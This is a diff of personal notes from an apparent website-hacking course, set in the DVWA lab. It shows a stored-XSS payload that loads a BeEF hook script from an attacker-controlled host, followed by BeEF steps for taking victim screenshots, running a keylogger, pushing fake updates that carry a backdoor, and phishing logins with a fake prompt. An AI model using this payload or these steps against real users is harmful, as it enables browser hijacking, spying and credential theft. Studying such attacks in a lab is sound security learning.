@@ -843,6 +843,7 @@ Step 7 -> now send this URL to any person and once they execute this URL they wi
  
  - in dvwa go to XSS stored give the name as beef and message as <script src="http://10.0.2.15:3000/hook.js"></script> , if it 
  not allowing u to enter more characters then increase the no. of maxlength by doing the inspect element and then click on the button
+ Ex -> https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019730#overview , 3:26
  - it will not show any thing but now u can send this URL http://10.0.2.4/dvwa/vulnerabilities/xss_s# instead of suspisious one and
  now u have o just wait for people to visit that URL and once they click that URL they will be hooked to ur beef and may be gain 
  full access to the server or the website
@@ -860,16 +861,18 @@ Step 7 -> now send this URL to any person and once they execute this URL they wi
  - the webrtc basically allows u to create a network of all browsers that u gained access to and try to hide urself by using peer to
  peer network
 
-- Beef Running basic cmds on victim ->
+Step 9 -> Beef Running basic cmds on victim ->
 - after the hook go to the commands tab, choose the cmd u wants to execute in categories already provided to u
-- in the search box of commands tab enter -> alert and the options related to them will appear to u, select the option "Create Alert Dialog"
-and enter the text u wants to show and then press Execute button
-// now on the victim machine u can see the alert appearing
+- go to the 'Browser' directory and select 'Spyder Eye' to take screenshot of victim browser same way u can go to 'Social Engineering'
+  and select 'Fake Flash Update'
+- in the search box of commands tab enter -> 'alert' and the options related to them will appear to u, select the option ->
+  "Create Alert Dialog" and enter the text u wants to show and then press Execute button
+  // now on the victim machine u can see the alert appearing
 - now search "raw" , choose the option "Raw Javascript" and then enter the code u want such as key logger or the alert etc
-such as alert("Alert")
+  such as alert("Alert")
 - now search "spy" select the option "spider eye" and after sometime u will be able to see the screenshot of the victim's Desktop
-- now search "redirect" select the option "redirect browser" then redirect the user to the URL u want and u can trick them to ask them to
-download an update and instead of an update I can put the backdoor
+- now search "redirect" select the option "redirect browser" then redirect the user to the URL u want and u can trick them to ask
+  them to download an update and instead of an update I can put the backdoor
 
 Stealing Credentials/Passwords using a fake login prompt // so baiscally the way it happens it will dim the screen and it will tell the person
 that u r logged out so plz log in into ur account again so u can get authenticated and this will allow us to bypass HTTPS and all other security
